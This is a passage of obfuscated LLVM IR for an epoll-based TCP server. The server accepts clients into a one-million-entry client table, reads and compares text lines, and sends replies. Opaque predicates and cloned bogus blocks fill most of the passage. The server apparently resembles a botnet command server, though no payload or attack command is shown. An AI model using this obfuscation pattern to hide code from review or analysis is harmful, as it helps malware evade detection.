  %103 = call i32 @accept(i32 %102, %struct.sockaddr* %9, i32* %10)
  store i32 %103, i32* %11, align 4
  %104 = load i32, i32* %11, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %164

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* @x.5
  %108 = load i32, i32* @y.6
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %106
  %115 = call i32* @__errno_location() #9
  %116 = load i32, i32* %115, align 4
  %117 = icmp eq i32 %116, 11
  %118 = load i32, i32* @x.5
  %119 = load i32, i32* @y.6
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %117, label %130, label %126

; <label>:126:                                    ; preds = %originalBBpart24
  %127 = call i32* @__errno_location() #9
  %128 = load i32, i32* %127, align 4
  %129 = icmp eq i32 %128, 11
  br i1 %129, label %130, label %147

; <label>:130:                                    ; preds = %126, %originalBBpart24
  %131 = load i32, i32* @x.5
  %132 = load i32, i32* @y.6
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %130
  %139 = load i32, i32* @x.5
  %140 = load i32, i32* @y.6
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %232

; <label>:147:                                    ; preds = %126
  %148 = load i32, i32* @x.5
  %149 = load i32, i32* @y.6
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %147
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))
  %156 = load i32, i32* @x.5
  %157 = load i32, i32* @y.6
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %232

; <label>:164:                                    ; preds = %101
  %165 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %165, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 2
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %170
  %172 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 4
  %173 = load i32, i32* %11, align 4
  %174 = call i32 @make_socket_non_blocking(i32 %173)
  store i32 %174, i32* %6, align 4
  %175 = load i32, i32* %6, align 4
  %176 = icmp eq i32 %175, -1
  br i1 %176, label %177, label %180

; <label>:177:                                    ; preds = %164
  %178 = load i32, i32* %11, align 4
  %179 = call i32 @close(i32 %178)
  br label %232

; <label>:180:                                    ; preds = %164
  %181 = load i32, i32* %11, align 4
  %182 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %183 = bitcast %union.epoll_data* %182 to i32*
  store i32 %181, i32* %183, align 1
  %184 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %184, align 1
  %185 = load volatile i32, i32* @epollFD, align 4
  %186 = load i32, i32* %11, align 4
  %187 = call i32 @epoll_ctl(i32 %185, i32 1, i32 %186, %struct.epoll_event* %4) #7
  store i32 %187, i32* %6, align 4
  %188 = load i32, i32* %6, align 4
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %190, label %209

; <label>:190:                                    ; preds = %180
  %191 = load i32, i32* @x.5
  %192 = load i32, i32* @y.6
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %190
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  %199 = load i32, i32* %11, align 4
  %200 = call i32 @close(i32 %199)
  %201 = load i32, i32* @x.5
  %202 = load i32, i32* @y.6
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %232

; <label>:209:                                    ; preds = %180
  %210 = load i32, i32* @x.5
  %211 = load i32, i32* @y.6
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %209
  %218 = load i32, i32* %11, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %219
  %221 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %220, i32 0, i32 2
  store i8 1, i8* %221, align 1
  %222 = load i32, i32* %11, align 4
  %223 = call i64 @send(i32 %222, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i32 0, i32 0), i64 14, i32 16384)
  %224 = load i32, i32* @x.5
  %225 = load i32, i32* @y.6
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %101

; <label>:232:                                    ; preds = %originalBBpart216, %177, %originalBBpart212, %originalBBpart28
  %233 = load i32, i32* @x.5
  %234 = load i32, i32* @y.6
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %232
  %241 = load i32, i32* @x.5
  %242 = load i32, i32* @y.6
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %517

; <label>:249:                                    ; preds = %90
  %250 = load i32, i32* @x.5
  %251 = load i32, i32* @y.6
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %259 = load i32, i32* %8, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %258, i64 %260
  %262 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %261, i32 0, i32 1
  %263 = bitcast %union.epoll_data* %262 to i32*
  %264 = load i32, i32* %263, align 1
  store i32 %264, i32* %13, align 4
  %265 = load i32, i32* %13, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %266
  store %struct.clientdata_t* %267, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %268 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %269 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %268, i32 0, i32 2
  store i8 1, i8* %269, align 1
  %270 = load i32, i32* @x.5
  %271 = load i32, i32* @y.6
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %278

; <label>:278:                                    ; preds = %489, %originalBBpart228
  %279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %279, i8 0, i64 2048, i32 16, i1 false)
  br label %280

; <label>:280:                                    ; preds = %originalBBpart252, %391, %370, %278
  %281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %281, i8 0, i64 2048, i32 16, i1 false)
  %282 = icmp ne i8* %281, null
  br i1 %282, label %283, label %289

; <label>:283:                                    ; preds = %280
  %284 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %285 = load i32, i32* %13, align 4
  %286 = call i32 @fdgets(i8* %284, i32 2048, i32 %285)
  %287 = sext i32 %286 to i64
  store i64 %287, i64* %16, align 8
  %288 = icmp sgt i64 %287, 0
  br label %289

; <label>:289:                                    ; preds = %283, %280
  %290 = phi i1 [ false, %280 ], [ %288, %283 ]
  br i1 %290, label %291, label %411

; <label>:291:                                    ; preds = %289
  %292 = load i32, i32* @x.5
  %293 = load i32, i32* @y.6
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %291
  %300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %301 = call i8* @strstr(i8* %300, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %302 = icmp eq i8* %301, null
  %303 = load i32, i32* @x.5
  %304 = load i32, i32* @y.6
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %302, label %311, label %328

; <label>:311:                                    ; preds = %originalBBpart232
  %312 = load i32, i32* @x.5
  %313 = load i32, i32* @y.6
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %311
  store i32 1, i32* %15, align 4
  %320 = load i32, i32* @x.5
  %321 = load i32, i32* @y.6
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %411

; <label>:328:                                    ; preds = %originalBBpart232
  %329 = load i32, i32* @x.5
  %330 = load i32, i32* @y.6
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %328
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %337)
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %339 = call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %340 = icmp eq i32 %339, 0
  %341 = load i32, i32* @x.5
  %342 = load i32, i32* @y.6
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %340, label %349, label %371

; <label>:349:                                    ; preds = %originalBBpart240
  %350 = load i32, i32* %13, align 4
  %351 = call i64 @send(i32 %350, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i32 0, i32 0), i64 5, i32 16384)
  %352 = icmp eq i64 %351, -1
  br i1 %352, label %353, label %370

; <label>:353:                                    ; preds = %349
  %354 = load i32, i32* @x.5
  %355 = load i32, i32* @y.6
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %353
  store i32 1, i32* %15, align 4
  %362 = load i32, i32* @x.5
  %363 = load i32, i32* @y.6
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %411

; <label>:370:                                    ; preds = %349
  br label %280

; <label>:371:                                    ; preds = %originalBBpart240
  %372 = load i32, i32* @x.5
  %373 = load i32, i32* @y.6
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %371
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0)) #8
  %382 = icmp eq i32 %381, 0
  %383 = load i32, i32* @x.5
  %384 = load i32, i32* @y.6
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %382, label %391, label %392

; <label>:391:                                    ; preds = %originalBBpart248
  br label %280

; <label>:392:                                    ; preds = %originalBBpart248
  %393 = load i32, i32* @x.5
  %394 = load i32, i32* @y.6
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %392
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %402 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* %401)
  %403 = load i32, i32* @x.5
  %404 = load i32, i32* @y.6
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %280

; <label>:411:                                    ; preds = %originalBBpart244, %originalBBpart236, %289
  %412 = load i32, i32* @x.5
  %413 = load i32, i32* @y.6
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %411
  %420 = load i64, i64* %16, align 8
  %421 = icmp eq i64 %420, -1
  %422 = load i32, i32* @x.5
  %423 = load i32, i32* @y.6
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %421, label %430, label %452

; <label>:430:                                    ; preds = %originalBBpart256
  %431 = call i32* @__errno_location() #9
  %432 = load i32, i32* %431, align 4
  %433 = icmp ne i32 %432, 11
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %430
  store i32 1, i32* %15, align 4
  br label %435

; <label>:435:                                    ; preds = %434, %430
  %436 = load i32, i32* @x.5
  %437 = load i32, i32* @y.6
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %435
  %444 = load i32, i32* @x.5
  %445 = load i32, i32* @y.6
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %490

; <label>:452:                                    ; preds = %originalBBpart256
  %453 = load i32, i32* @x.5
  %454 = load i32, i32* @y.6
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %452
  %461 = load i64, i64* %16, align 8
  %462 = icmp eq i64 %461, 0
  %463 = load i32, i32* @x.5
  %464 = load i32, i32* @y.6
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %462, label %471, label %472

; <label>:471:                                    ; preds = %originalBBpart264
  store i32 1, i32* %15, align 4
  br label %490

; <label>:472:                                    ; preds = %originalBBpart264
  %473 = load i32, i32* @x.5
  %474 = load i32, i32* @y.6
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %472
  %481 = load i32, i32* @x.5
  %482 = load i32, i32* @y.6
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %489

; <label>:489:                                    ; preds = %originalBBpart268
  br label %278

; <label>:490:                                    ; preds = %471, %originalBBpart260
  %491 = load i32, i32* %15, align 4
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %498

; <label>:493:                                    ; preds = %490
  %494 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %495 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %494, i32 0, i32 2
  store i8 0, i8* %495, align 1
  %496 = load i32, i32* %13, align 4
  %497 = call i32 @close(i32 %496)
  br label %498

; <label>:498:                                    ; preds = %493, %490
  %499 = load i32, i32* @x.5
  %500 = load i32, i32* @y.6
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %498
  %507 = load i32, i32* @x.5
  %508 = load i32, i32* @y.6
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %515

; <label>:515:                                    ; preds = %originalBBpart272
  br label %516

; <label>:516:                                    ; preds = %515
  br label %517

; <label>:517:                                    ; preds = %516, %originalBBpart224, %71
  %518 = load i32, i32* %8, align 4
  %519 = add nsw i32 %518, 1
  store i32 %519, i32* %8, align 4
  br label %24

; <label>:520:                                    ; preds = %originalBBpart2
  br label %20
                                                  ; No predecessors!
  %522 = load i8*, i8** %2, align 8
  ret i8* %522

originalBBalteredBB:                              ; preds = %originalBB, %24
  %523 = load i32, i32* %8, align 4
  %524 = load i32, i32* %7, align 4
  %525 = icmp slt i32 %523, %524
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %106
  %526 = call i32* @__errno_location() #9
  %527 = load i32, i32* %526, align 4
  %528 = icmp eq i32 %527, 11
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %130
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %147
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %190
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  %529 = load i32, i32* %11, align 4
  %530 = call i32 @close(i32 %529)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %209
  %531 = load i32, i32* %11, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %532
  %534 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %533, i32 0, i32 2
  store i8 1, i8* %534, align 1
  %535 = load i32, i32* %11, align 4
  %536 = call i64 @send(i32 %535, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i32 0, i32 0), i64 14, i32 16384)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %232
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  %537 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %538 = load i32, i32* %8, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %537, i64 %539
  %541 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %540, i32 0, i32 1
  %542 = bitcast %union.epoll_data* %541 to i32*
  %543 = load i32, i32* %542, align 1
  store i32 %543, i32* %13, align 4
  %544 = load i32, i32* %13, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %545
  store %struct.clientdata_t* %546, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %547 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %548 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %547, i32 0, i32 2
  store i8 1, i8* %548, align 1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %291
  %549 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %550 = call i8* @strstr(i8* %549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %551 = icmp eq i8* %550, null
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %311
  store i32 1, i32* %15, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %328
  %552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %552)
  %553 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %554 = call i32 @strcmp(i8* %553, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %555 = icmp eq i32 %554, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %353
  store i32 1, i32* %15, align 4
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %371
  %556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %557 = call i32 @strcmp(i8* %556, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0)) #8
  %558 = icmp eq i32 %557, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %392
  %559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %560 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* %559)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %411
  %561 = load i64, i64* %16, align 8
  %562 = icmp eq i64 %561, -1
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %435
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %452
  %563 = load i64, i64* %16, align 8
  %564 = icmp eq i64 %563, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %472
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %498
  br label %originalBB70
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %1
  %11 = load i32, i32* @x.7
  %12 = load i32, i32* @y.8
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  %19 = load i32, i32* @x.7
  %20 = load i32, i32* @y.8
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:27:                                     ; preds = %1
  %28 = load i32, i32* %4, align 4
  %29 = or i32 %28, 2048
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %3, align 4
  %31 = load i32, i32* %4, align 4
  %32 = call i32 (i32, i32, ...) @fcntl(i32 %30, i32 4, i32 %31)
  store i32 %32, i32* %5, align 4
